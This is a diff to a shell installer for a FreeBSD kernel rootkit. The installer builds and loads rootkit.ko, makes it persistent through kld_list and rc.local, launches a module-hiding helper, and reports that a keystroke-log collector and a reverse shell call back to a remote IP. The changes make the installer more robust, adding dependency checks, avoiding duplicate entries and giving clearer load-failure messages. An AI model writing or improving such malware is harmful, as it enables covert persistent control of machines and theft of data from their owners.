@@ -27,12 +27,11 @@ fail() {
 [ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
-# Store REMOTE IP for reverse shell callbacks
-echo "$REMOTE_IP" > /etc/rootkit_remote_ip
-
-# Check dependencies
+# Check dependencies. Without the `|| fail` these were silent under `set -e`:
+# the loop only returned the status of the last command -v.
 for command in make kldload kldstat cc install sysrc realpath; do
-    command -v "$command" >/dev/null 2>&1
+    command -v "$command" >/dev/null 2>&1 ||
+        fail "required command not found: $command"
 done
 
 # Build rootkit.ko
@@ -65,8 +64,11 @@ install -d -m 755 "$PERSISTENCE_DIR"
 install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
 
 
-# Add rootkit to kld_list without duplicating existing entries
-sysrc kld_list+=rootkit >/dev/null
+# Add rootkit to kld_list without duplicating existing entries. sysrc's "+="
+# appends blindly, so a second install used to leave "rootkit rootkit".
+if ! sysrc -n kld_list 2>/dev/null | tr ' ' '\n' | grep -qx rootkit; then
+    sysrc kld_list+=rootkit >/dev/null
+fi
 
 # Verify elevate was built successfully
 [ -f "$ELEVATE_BIN" ]
@@ -137,12 +139,22 @@ chmod +x /etc/rc.local
 if ! grep -q "hide_kld" /etc/rc.local; then
     echo "$ABS_PATH &" >> /etc/rc.local
 fi
-# Load it during the current boot
+# Load it during the current boot. `set -e` would already have exited on a
+# failing kldload, so the old post-hoc check was dead code; say why instead.
 if [ "$MODULE_LOADED" = false ]; then
-    kldload "$PERSISTENCE_FILE"
+    kldload "$PERSISTENCE_FILE" ||
+        fail "kldload $PERSISTENCE_FILE failed; see dmesg (Unresolved symbol?)"
     if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
-        exit 1
+        fail "rootkit.ko loaded but neither kldstat nor /dev/rootkit confirms it"
     fi
 fi
 
 "$ABS_PATH" &
+
+printf 'rootkit.ko installed to %s\n' "$PERSISTENCE_FILE"
+if [ -x "$RKLOG" ]; then
+    printf 'rklog started (collector %s:%s)\n' "${REMOTE_IP:-none}" "$LOG_PORT"
+fi
+if [ -x /usr/local/bin/revshell ]; then
+    printf 'revshell waiting for a callback from %s\n' "${REMOTE_IP:-none}"
+fi
